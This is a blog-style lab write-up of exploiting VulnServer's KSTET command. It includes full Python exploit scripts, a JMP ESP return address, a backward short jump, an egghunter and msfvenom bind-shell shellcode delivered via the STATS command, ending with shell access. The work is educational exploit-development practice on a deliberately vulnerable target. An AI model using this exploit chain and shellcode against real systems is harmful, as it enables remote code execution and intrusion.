---
layout: post
title:  "[VulnServer] Exploiting KSTET Command with Minimal Buffer Space Using Egghunter"
date:   2018-06-29
categories: [exploitdev, osceprep]
---

I used the following skeleton for the exploitation of the `KSTET` command. Instead of sending 5000 bytes of buffer to fuzz the command, I only used **1000 bytes** this time.
```python
#!/usr/bin/python

import os
import sys
import socket

host = "192.168.1.129"
port = 9999

buffer = "A”*1000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending exploit..."
s.send("KSTET " + buffer)
print s.recv(1024)
s.close()
```
The 1000 bytes of buffer were enough to crash the application. As seen, even if 1000 bytes of buffer were sent, only 94 bytes were accepted by the application. _(Note: I kept the original buffer length of 1000 bytes for the rest of the exploitation so as not to deviate from my skeleton.)_
![Crash](/static/img/04/01.png)

Using `!mona pc 1000`, I generated 1000 bytes of unique string as buffer so I could determine the offset that overwrote **EIP**.
```python
#!/usr/bin/python

import os
import sys
import socket

host = "192.168.1.129"
port = 9999

buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending exploit..."
s.send("KSTET " + buffer)
print s.recv(1024)
s.close()
```

Sending this unique string caused **EIP** to be overwritten with **63413363**.
![EIP Overwrite](/static/img/04/02.png)

Using `!mona findmsp`, I discovered that the offset was **70 bytes**.
![Offset](/static/img/04/03.png)

To verify if it was correct, I sent the following modified code. 
```python
#!/usr/bin/python

import os
import sys
import socket

host = "192.168.1.129"
port = 9999

buffer = "A"*70
buffer += "BBBB"
buffer += "C"*(1000-len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending exploit..."
s.send("KSTET " + buffer)
print s.recv(1024)
s.close()
```

As seen, the offset was correct and **EIP** was overwritten with 4 B’s. One thing to note here was that **ESP** pointed to the 20 bytes of C’s, which was located right after the 4 B’s.
![Correct Offset](/static/img/04/04.png)

Just like in my [previous post](https://capt-meelo.github.io/exploitdev/osceprep/2018/06/28/vulnserver-gter.html), the limited buffer space made me split the characters from `\x01` to `\xFF` to identify the bad character. Again, the **NULL** (`\x00`) character was already removed. The first split contained the characters from `\x01` to `\4F`.
```python
#!/usr/bin/python

import os
import sys
import socket

host = "192.168.1.129"
port = 9999

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f")

buffer = badchars
buffer += "C"*(1000-len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending exploit..."
s.send("KSTET " + buffer)
print s.recv(1024)
s.close()
```

As seen here, there were no bad characters detected.
![1st Batch](/static/img/04/05.png)

The next batch of characters that I tested were `\x50` to `\x9F`.
![2nd Batch](/static/img/04/06.png)

Followed by `\xA0` to `\xCF`.
![3rd Batch](/static/img/04/07.png)

The last batch were `\xD0` to `\xFF`. After the repetitive process of identifying the bad characters, only `\x00` was considered one.
![4th Batch](/static/img/04/08.png)

Then I used `!mona jmp -r esp -m ‘essfunc.dll’` to identify an address containing a `JMP ESP` instruction. Several addresses were discovered. However, for this exploitation, I used `0x625011AF`. 
![JMP ESP](/static/img/04/09.png)

I then modified the code to reflect the discovered address.
```python
#!/usr/bin/python

import os
import sys
import socket

host = "192.168.1.129"
port = 9999

buffer = "A"*70
buffer += "\xAF\x11\x50\x62"         # JMP ESP 625011AF from essfunc.dll
buffer += "C"*(1000-len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending exploit..."
s.send("KSTET " + buffer)
print s.recv(1024)
s.close()
```

As seen here, it worked and I was redirected to the buffer of C’s. Just like in my [previous post](https://capt-meelo.github.io/exploitdev/osceprep/2018/06/28/vulnserver-gter.html), the buffer of A’s were located above the buffer of C’s. So, I had to jump backwards again.
![JMP ESP Worked](/static/img/04/10.png)

Instead of jumping to the start of A’s, I decided to jump back only with 50 bytes. The opcode of **short jump** is `\xEB`, while **-50** is equivalent to `0xFFFFFFCE`. 
![Calculator](/static/img/04/11.png)

So, the opcode of the instruction that I used to jump backwards 50 bytes was `\xEB\xCE`.
```python
#!/usr/bin/python

import os
import sys
import socket

host = "192.168.1.129"
port = 9999

buffer = "A"*70
buffer += "\xAF\x11\x50\x62"    # JMP ESP 625011AF from essfunc.dll
buffer += "\xEB\xCE"            # Jump back 50 bytes to give room for egghunter    
buffer += "C"*(1000-len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending exploit..."
s.send("KSTET " + buffer)
print s.recv(1024)
s.close()
```

As seen here, the jump was successful and I was redirected to 48 bytes ($-30h) relative to the position of the jump instruction ($). If you’re curious why 48 bytes only, the missing 2 bytes were covered by the opcode `\xEB\xCE`.
![Negative Jump](/static/img/04/12.png)

Since everything was working well, I used `!mona egg -t Capt` to generate the egghunter.
![Egghunter](/static/img/04/13.png)

Before using the egghunter, I had to determine first the offset (the number of A’s) before the egghunter code. To do that, I made a simple computation: **original 70 bytes of A's + 4 bytes for JMP ESP + 2 bytes for the backward jump opcodes - 50 bytes for the length of backward jump = 26 bytes of A’s**. The following shows what the buffer looked like and its flow:
![Flow](/static/img/04/14.png)

To test if my computation was correct, I executed the following.
```python
#!/usr/bin/python

import os
import sys
import socket

host = "192.168.1.129"
port = 9999

# Egg:  Capt
# Size: 32 bytes
egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x43\x61\x70\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

buffer = "A"*26
buffer += egghunter
buffer += "A"*(70-len(buffer))
buffer += "\xAF\x11\x50\x62"    # JMP ESP 625011AF from essfunc.dll
buffer += "\xEB\xCE"            # Jump back 50 bytes to give room for egghunter    
buffer += "C"*(1000-len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending exploit..."
s.send("KSTET " + buffer)
print s.recv(1024)
s.close()
```

It worked! I was redirected to the start of the egghunter code.
![Start of Egghunter](/static/img/04/15.png)

Then I generated a shellcode using the MSFvenom.
![MSFvenom](/static/img/04/16.png)

Since the shellcode won’t fit inside the `KSTET` command, I used the `STATS` command to send my shellcode. This way, my shellcode would be placed somewhere in memory and let the egghunter find it.
```python
#!/usr/bin/python

import os
import sys
import socket

host = "192.168.1.129"
port = 9999

# msfvenom -p windows/shell_bind_tcp EXITFUNC=thread -b "\x00" -f c
# Payload size: 355 bytes
shellcode = ("\xb8\x43\x44\x5d\xed\xdd\xc0\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
"\x53\x31\x46\x12\x03\x46\x12\x83\x85\x40\xbf\x18\xf5\xa1\xbd"
"\xe3\x05\x32\xa2\x6a\xe0\x03\xe2\x09\x61\x33\xd2\x5a\x27\xb8"
"\x99\x0f\xd3\x4b\xef\x87\xd4\xfc\x5a\xfe\xdb\xfd\xf7\xc2\x7a"
"\x7e\x0a\x17\x5c\xbf\xc5\x6a\x9d\xf8\x38\x86\xcf\x51\x36\x35"
"\xff\xd6\x02\x86\x74\xa4\x83\x8e\x69\x7d\xa5\xbf\x3c\xf5\xfc"
"\x1f\xbf\xda\x74\x16\xa7\x3f\xb0\xe0\x5c\x8b\x4e\xf3\xb4\xc5"
"\xaf\x58\xf9\xe9\x5d\xa0\x3e\xcd\xbd\xd7\x36\x2d\x43\xe0\x8d"
"\x4f\x9f\x65\x15\xf7\x54\xdd\xf1\x09\xb8\xb8\x72\x05\x75\xce"
"\xdc\x0a\x88\x03\x57\x36\x01\xa2\xb7\xbe\x51\x81\x13\x9a\x02"
"\xa8\x02\x46\xe4\xd5\x54\x29\x59\x70\x1f\xc4\x8e\x09\x42\x81"
"\x63\x20\x7c\x51\xec\x33\x0f\x63\xb3\xef\x87\xcf\x3c\x36\x50"
"\x2f\x17\x8e\xce\xce\x98\xef\xc7\x14\xcc\xbf\x7f\xbc\x6d\x54"
"\x7f\x41\xb8\xc1\x77\xe4\x13\xf4\x7a\x56\xc4\xb8\xd4\x3f\x0e"
"\x37\x0b\x5f\x31\x9d\x24\xc8\xcc\x1e\x5b\x55\x58\xf8\x31\x75"
"\x0c\x52\xad\xb7\x6b\x6b\x4a\xc7\x59\xc3\xfc\x80\x8b\xd4\x03"
"\x11\x9e\x72\x93\x9a\xcd\x46\x82\x9c\xdb\xee\xd3\x0b\x91\x7e"
"\x96\xaa\xa6\xaa\x40\x4e\x34\x31\x90\x19\x25\xee\xc7\x4e\x9b"
"\xe7\x8d\x62\x82\x51\xb3\x7e\x52\x99\x77\xa5\xa7\x24\x76\x28"
"\x93\x02\x68\xf4\x1c\x0f\xdc\xa8\x4a\xd9\x8a\x0e\x25\xab\x64"
"\xd9\x9a\x65\xe0\x9c\xd0\xb5\x76\xa1\x3c\x40\x96\x10\xe9\x15"
"\xa9\x9d\x7d\x92\xd2\xc3\x1d\x5d\x09\x40\x3d\xbc\x9b\xbd\xd6"
"\x19\x4e\x7c\xbb\x99\xa5\x43\xc2\x19\x4f\x3c\x31\x01\x3a\x39"
"\x7d\x85\xd7\x33\xee\x60\xd7\xe0\x0f\xa1")

# Egg:  Capt
# Size: 32 bytes
egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x43\x61\x70\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

buffer = "A"*26
buffer += egghunter
buffer += "A"*(70-len(buffer))
buffer += "\xAF\x11\x50\x62"    # JMP ESP 625011AF from essfunc.dll
buffer += "\xEB\xCE"            # Jump back 50 bytes to give room for egghunter    
buffer += "C"*(1000-len(buffer))

# Used to send the 2nd stage shellcode
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending shellcode somewhere in memory via STATS command..."
s.send("STATS " + "CaptCapt" + shellcode)
print s.recv(1024)
s.close()

# Used to send the 1st stage shellcode (egghunter)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print "[*] Sending exploit..."
s.send("KSTET " + buffer)
print s.recv(1024)
s.close()
```

Upon executing the final exploit code, the egghunter successfully located my shellcode after the `STATS` command.
![STATS](/static/img/04/17.png)

Since the shellcode worked, the target machine spawned a “listening” port on **4444/tcp**.
![Success](/static/img/04/18.png)

The last thing to do was to connect to the newly opened port to have a shell access.
![Shell Access](/static/img/04/19.png)
